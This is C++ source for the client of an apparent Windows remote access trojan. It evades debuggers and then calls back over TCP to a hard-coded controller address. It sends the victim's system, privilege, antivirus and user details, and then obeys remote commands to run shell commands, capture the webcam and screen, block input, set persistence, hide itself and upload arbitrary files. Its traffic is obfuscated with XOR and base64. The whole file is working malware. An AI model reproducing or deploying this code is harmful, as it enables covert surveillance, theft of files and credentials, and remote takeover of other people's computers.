// server.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <iostream>
#include <stdio.h>
#include <winsock2.h>
#include <string>
#include <chrono>
#include <thread>
#include <iomanip>
#include <sstream>
#include <vector>
#include <fstream>
#include <iterator>
#include <cstdio>
#include <winuser.h>
#include <libloaderapi.h>


#include "base64.cpp"
#include "base64.h"
#include "perms.cpp"
#include "vmCheck.cpp"
#include "osVersion.cpp"
#include "antiDBG.cpp"
#include "avCheck.cpp"
#include "gethostinfo.cpp"
#include "webcam.cpp"
#include "screenshot.cpp"
#include "blockInput.cpp"
#include "cmdExec.cpp"
#include "persist.cpp"
#include "disableScreen.cpp"
#include "hide.cpp"
#include "messageBox.cpp"

#pragma warning(disable:4996) 

#pragma comment(lib,"ws2_32.lib") //Winsock Library
using namespace std;

//global vars
SOCKET client;
char randbuff[1024];
char buffer[1024];
char buffer_256[256];
char buffer_1024[1024];
char buffer_2048[2048];
char buffer_4096[4096];


string color_RED = "\033[91m";
string color_GRE = "\033[92m";
string color_YELL = "\033[93m";
string color_BLU = "\033[94m";
string color_PURP = "\033[35m";
string color_reset = "\033[0m";
string GRE_plus = color_GRE + "[+] " + color_reset;
string YELL_exclm = color_YELL + "[!] " + color_reset;
string RED_exclm = color_RED + "[!] " + color_reset;

string zfill(int num, int size){ // num is the origional number to pad: size is the total size so if i do zfill(123, 5) output is 00123

	ostringstream ss;
	ss << setw(size) << setfill('0') << num;
	return ss.str();
}

string ljust(string str, int size){ // str is the origional string to pad size is the total length of the string so ljust(snake, 10) outputs "snake     " snake + 5 spaces = 10 total size
	str.append(size - str.length(), ' ');
	return str;
}


string str_xor(string message) {
	string key = "8aLdrdWLSiE4UMw4kfMnWIG0qO50jqDgtjprzWdHrsaYBXhdSiRwgr8EJ2u32lwZtoVgurcPmQXJYV0SGVYRUFAfHzyqyz46zvlQgx8eA0ZcJt6uRWZkDxMRc30P35IAhTmIkXOv408LjpREnZXYxz7ZDauTRMQmbu7MJsGCRB7HDBSMuqqRgN1C4GOvS2XEUFI5ogqJLxlnHde6nm8f9qQdyKPEcq1alS9Lvb6NtiT2iaXPnRnBzUrjPIVq9lVoLWFnPE5QTB3yWWLLqvbw6sIkX8WFbbtBqHSe3D1XAE0IB2wqOOUTJ8YvN6BOfdKWWiLJl6rq7gH9VIquwZ7L1DQmVra2I4oyFd3HUL6J995aO82epY1Ti5aSYetjMWx8XmDe6YedRTVcQWQyjpmEeN6QFGsaEcW8hC4tv0ZVooNna3CAc9hLPX2fw0XwjvDKPYZcjx7mprJoLWFedbgKmsNhwml6LiCAq00blZb4kRS948k3md7yA1QsTa4JERh7cUfZcVPtZAEEuoTzeHuv0ZDRew9XQtD3NH3i8v6mbQQPRBTE8ihvLmZ6ynAIvIZMJDcyA7rZOKDvrzaZDGg9QzZN0MI9B8cCY8uqtOEzrWCYLM4hmwTz3Pez8z2bYMzj7TylISKeuCghvboiMoZqJXPIdxUByBsb0SmXbZHvGcQNSAw5kADH4NY1ucOePRkzsAw3qByO0peUkIUDA4GCL3HNObr1ZDN0dCwYaeGCsWWTGSYtqAwDlIWxc3WohcUxTbRePAG9tLmQ7Tkwj0hQXHWwiKEFYuGeETzldVLuHhFLI3BQ3kSVGPGJqLa2je9HDH1ImMYVsR1PmpMatUcuGeQQiArJrbgvL5qlTdlhQR0CwI6lyxe3HVb6jGQK3ysWD71O";
	string out = "";
	int count = 0;
	for (int x = 0; x < message.length(); x++) {
		out += char(int(message.at(x)) ^ int(key.at(count)));
		if (count == key.length()) {
			count = 0;
		}
	}
	return out;
}


void sleep(int time) {
	this_thread::sleep_for(chrono::seconds(time));
}



void _bigsend(string data){
	//data = str_xor(data);
	data = base64_encode(reinterpret_cast<const unsigned char*>(data.c_str()), data.length());
	string data_length = zfill(data.size(), 12).c_str();
	data_length = str_xor(data_length);

	send(client, data_length.c_str(), data_length.length(), 0);
	recv(client, randbuff, sizeof(randbuff), 0);
	send(client, data.c_str(), data.length(), 0);
}

vector<BYTE> readFile(string filename)
{
	// open the file:
	ifstream file(filename, ios::binary);

	// Stop eating new lines in binary mode!!!
	file.unsetf(ios::skipws);

	// get its size:
	streampos fileSize;

	file.seekg(0, ios::end);
	fileSize = file.tellg();
	file.seekg(0, ios::beg);

	// reserve capacity
	vector<BYTE> vec;
	vec.reserve(fileSize);

	// read the data:
	vec.insert(vec.begin(),
		istream_iterator<BYTE>(file),
		istream_iterator<BYTE>());

	return vec;
}

void send_file(string file_path) {
	try {
		vector<BYTE> file_data = readFile(file_path);
		string string1(reinterpret_cast<const char *>(&file_data[0]), file_data.size());
		// IMPORTANT BASE64ENCODE string1 as its causeing codec errors on the python side??? "shrug"
		_bigsend(string1);
	}catch (...) {
		_bigsend("Client experienced an error :(");
	}
}


void _send(string msg) {
	msg = str_xor(msg);
	send(client, msg.c_str(), msg.length(), 0);
}

string _recieve(int BUFFER_SIZE) { // TODO figure out how to make this work better
	string data_str;
	if (BUFFER_SIZE == 256) {
		memset(buffer_256, 0, sizeof(buffer_256));
		recv(client, buffer_256, sizeof(buffer_256), 0);
		data_str = string(buffer_256);
	}
	else if (BUFFER_SIZE == 1024) {
		memset(buffer_1024, 0, sizeof(buffer_1024));
		recv(client, buffer_1024, sizeof(buffer_1024), 0);
		data_str = string(buffer_1024);
	}
	else if (BUFFER_SIZE == 2048) {
		memset(buffer_2048, 0, sizeof(buffer_2048));
		recv(client, buffer_2048, sizeof(buffer_2048), 0);
		data_str = string(buffer_2048);
	}
	else if (BUFFER_SIZE == 4096) {
		memset(buffer_4096, 0, sizeof(buffer_4096));
		recv(client, buffer_4096, sizeof(buffer_4096), 0);
		data_str = string(buffer_4096);
	}
	else {
		memset(buffer, 0, sizeof(buffer));
		recv(client, buffer, sizeof(buffer), 0);
		data_str = string(buffer);
	}
	
	data_str = str_xor(data_str);
	return data_str;
}


// add an antidebug check where the bool isdebugpresent = true; so if they skip the code for it itll still be true
int main(int argc, char** argv){
	if (debug_chk() == true) {
		exit(0);
	}

	//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // uncomment to hide the window

	reset:
	WSADATA wsa;
	
	struct sockaddr_in server;
	string message;
	cout << "\nInitialising" << endl;
	if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0){

		printf("Failed. Error Code : %d", WSAGetLastError());
		sleep(5);
		goto reset;
	}

	printf("Initialised.\n");

	//Create a socket
	if((client = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
		cout << "Could not create socket : %d" + WSAGetLastError() << endl;
		sleep(5);
		goto reset;
	}

	cout << "Socket created." << endl;


	server.sin_addr.s_addr = inet_addr("192.168.56.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(23478);

	//Connect to remote server
	if(connect(client, (struct sockaddr *)&server, sizeof(server)) < 0){
		cout << "connect error" << endl;
		sleep(5);
		goto reset;
	}

	cout << "Connected" << endl;
	//Send client info DH13

	message = os_info() + "," + perms() + "," + vm_check() + "," + av_check() + ", " + get_username() + "," + get_hostname();

	_send(message);

	string command;
	// this will be the command loop
	while(true){
		try {
			command = _recieve(1024);
			cout << command << endl;
			_send(GRE_plus + "Command Recieved");
			if (command == "get_host_info") {
				_send(get_username() + "@" + get_hostname() + ":~$ " + get_cwd() + ">");
			
			}else if (command == "webcam_ss") {
				string fp = takeSS();
				if (fp == "Camera Error") {
					_send("err");
				}
				else {
					send_file(fp);
					remove(fp.c_str());
				}
			
			}else if (command == "screenshot") {
				string fp = screenshot();
				send_file(fp);
				remove(fp.c_str());
			
			}else if (command == "block_input") {
				string tof = _recieve(256);
				if (perms() == "Admin") { // this function only works if program is an admin
					if (tof == "true") {
						_send(dis_inp(true));
					}else if(tof == "false"){
						_send(dis_inp(false));
					}else {
						_send(YELL_exclm + "Invalid arguments");
					}
				}else {
					_send(YELL_exclm + "Admin permissions is required for this");
				}
			
			}else if (command == "cmd") {
				string cmd2run = _recieve(4096);
				_send(cmd(cmd2run));
			
			}else if (command == "persist") {
				string persist_type = _recieve(1024);
				_send(persist(persist_type, argv[0]));
			
			}else if (command == "disable_screen") {
				string tof = _recieve(1024);
				if (tof == "true") {
					_send(blankMonitor(true));
				}else {
					_send(blankMonitor(false));
				}
			
			}else if (command == "hide") {
				_send(hide(argv[0]));
				sleep(2);
				exit(0);
			
			}else if (command == "message") {
				string message = _recieve(4096);
				thread t1(mBox, message);
				t1.detach();
				_send(GRE_plus + "Message sent");
				
			}
			else if (command == "download") {
				string file = _recieve(1024);
				send_file(file);
			}


			else if (command == "kill") {
				_recieve(256);
				_send("Hasta la vista");
				sleep(2);
				exit(0);

			}


		}catch(string e1){
			cout << e1 << endl;
			goto reset;
		}
		
		if (command.length() < 1) {goto reset;} // if the server dcs it will cause commands length to be 0 and this check will cause the program to restart the main function 
	}

	return 0;
}